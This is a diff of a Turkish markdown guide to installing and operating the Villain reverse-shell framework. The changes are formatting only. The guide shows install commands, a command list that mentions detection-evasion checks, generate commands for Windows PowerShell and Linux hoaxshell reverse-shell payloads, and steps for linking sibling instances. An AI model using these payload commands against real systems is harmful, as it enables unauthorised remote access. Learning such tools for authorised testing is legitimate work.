@@ -2,14 +2,20 @@
 
 **İki seçenek bulunmaktadır.**
 1) Direkt Kali sisteminde apt komutu ile villain kurulumu:
-`apt install villain`
 
-2) Yeni güncellemeler anında gelmeyebilir bu yüzden sırasıyla şu komutları yazarak Villain'i kurun:
-`git clone https://github.com/t3l3machus/Villain
-cd ./Villain
-pip3 install -r requirements.txt`
+   `apt install villain`
+
+3) Yeni güncellemeler anında gelmeyebilir bu yüzden sırasıyla şu komutları yazarak Villain'i kurun:
+
+   `git clone https://github.com/t3l3machus/Villain`
+
+   `cd ./Villain`
+
+   `pip3 install -r requirements.txt`
+
 
 Bunuda kurmanız lazım:
+
 `sudo apt update&&sudo apt install gnome-terminal`
 
 Villian komutları:
@@ -23,10 +29,11 @@ Villian komutları:
 + cmdinspector: Şüpheli komut çalıştırma veya tespit önleme işlevlerini kontrol eder.
 
 Windows için generate kodu = `generate lhost=eth0 payload=windows/reverse_tcp/powershell`
+
 Linux için generate kodu = `generate lhost=eth0 payload=linux/hoaxshell/sh_curl`
 
 Kardeş kullanımı için (birbirine bağlanan cihazlar birbirinin erişebildiği cihazlara erişebilir):
-Villain kullanan bir cihazdan ip a s yazarak ip bilgisi alın ve 2.cihazda Villain çalıştırdıktan sonra connect <ip> komutu yazın. İstek ilk bilgisayara yollanıcak ve bir şifre girmeniz gerekicek. Onu yazdıktan sonra onay vermiş olcaksınız ve böylece bağlanma işlemi bitmiş olcak. Sonrasında ise siblings yazarak kardeş sistem bilgilerine erişebilirsiniz.
+Villain kullanan bir cihazdan `ip a s` yazarak ip bilgisi alın ve 2.cihazda Villain çalıştırdıktan sonra `connect <ip>` komutu yazın. İstek ilk bilgisayara yollanıcak ve bir şifre girmeniz gerekicek. Onu yazdıktan sonra onay vermiş olcaksınız ve böylece bağlanma işlemi bitmiş olcak. Sonrasında ise siblings yazarak kardeş sistem bilgilerine erişebilirsiniz.
 
 Örnek Kullanım:
 
